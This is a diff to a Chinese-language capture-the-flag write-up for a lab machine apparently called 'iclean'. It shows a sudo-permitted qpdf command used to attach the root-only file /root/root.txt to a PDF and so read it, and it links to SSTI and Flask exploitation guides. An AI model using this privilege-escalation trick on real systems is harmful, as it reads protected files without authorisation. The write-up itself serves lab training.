@@ -742,5 +742,19 @@ User consuela may run the following commands on iclean:
 搜索qpdf，其是一个实现pdf加密，融合等功能的工具
 查看其功能，会注意到有添加附件的功能：
 ![[Pasted image 20240408175518.png]]
-那么可以将/root/root.txt附加到现有的d
+那么可以将/root/root.txt附加到现有的pdf后就可以获取到rootflag了
+搜索现有的pdf文件：
+```sh
+(remote) consuela@iclean:/home/consuela$ find / -name '*.pdf' 2>/dev/null
+/usr/share/doc/shared-mime-info/shared-mime-info-spec.pdf
+```
+执行：
+```sh
+sudo qpdf --add-attachment /root/root.txt -- /usr/share/doc/shared-mime-info/shared-mime-info-spec.pdf 4.pdf
+```
+运行python服务器，下载pdf，打开附件拿到rootflag:
+![[Pasted image 20240408180108.png]]
+## Hint
+对于页面可能有缺陷的漏洞都可以进行尝试，没有思路google一下大概率能解决问题
 AboutSSTI:[SSTI (Server Side Template Injection) | HackTricks | HackTricks --- SSTI（服务器端模板注入） |黑客技巧 |黑客技巧](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+AboutFlaskVul:[flask漏洞利用小结 - inhann的博客 | inhann's Blog](https://www.inhann.top/2021/02/25/flask_newer/)
